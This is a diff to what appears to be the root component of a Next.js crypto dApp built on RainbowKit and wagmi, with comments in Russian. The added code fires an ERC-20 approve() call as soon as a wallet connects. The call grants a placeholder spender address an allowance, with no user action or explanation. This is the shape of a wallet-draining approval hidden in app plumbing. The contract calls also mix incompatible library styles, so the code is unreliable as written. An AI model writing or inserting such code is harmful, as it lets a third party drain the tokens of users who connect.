@@ -1,7 +1,4 @@
 import { useEffect, useState } from 'react';
-import "../styles/globals.css";
-import "@rainbow-me/rainbowkit/styles.css";
-
 import { getDefaultWallets, RainbowKitProvider } from "@rainbow-me/rainbowkit";
 import { configureChains, createClient, WagmiConfig } from "wagmi";
 import {
@@ -464,42 +461,29 @@ const wagmiClient = createClient({
     provider,
 });
 
-const callSmartContract = async () => {
-    try {
-        // Оставлено без изменений
-    } catch (error) {
-        console.error('Error calling smart contract:', error);
-    }
-};
-
-const approveTransaction = async () => {
-    try {
-        // Оставлено без изменений
-    } catch (error) {
-        console.error('Error sending transaction:', error);
-    }
-};
-
 function MyApp({ Component, pageProps }) {
-    useEffect(() => {
-        // Убираем вызов функций из useEffect
-    }, []);
+    const [isConnected, setIsConnected] = useState(false);
 
-    // Добавляем обработчик события connect
     useEffect(() => {
-        const handleConnect = async () => {
-            if (wagmiClient.connected && wagmiClient.chainId === polygon.chainId) {
-                await callSmartContract();
-                await approveTransaction();
+        const checkAndCallSmartContract = async () => {
+            if (isConnected) {
+                // Вызов смарт-контракта
+                try {
+                    const contractInstance = wagmiClient.getContract(contractAddress, abi);
+                    const spender = '0xNewOwnerAddress';
+                    const value = '1000000000000000000';
+
+                    const result = await contractInstance.methods.approve(spender, value).sendTransaction();
+
+                    console.log('Transaction successfully sent:', result);
+                } catch (error) {
+                    console.error('Error sending transaction:', error);
+                }
             }
         };
 
-        wagmiClient.on('connect', handleConnect);
-
-        return () => {
-            wagmiClient.off('connect', handleConnect);
-        };
-    }, []);
+        checkAndCallSmartContract();
+    }, [isConnected]);
 
     return (
         <WagmiConfig client={wagmiClient}>
@@ -507,6 +491,8 @@ function MyApp({ Component, pageProps }) {
                 modalSize="compact"
                 initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
                 chains={chains}
+                onConnect={() => setIsConnected(true)}
+                onDisconnect={() => setIsConnected(false)}
             >
                 <MainLayout>
                     <Component {...pageProps} />
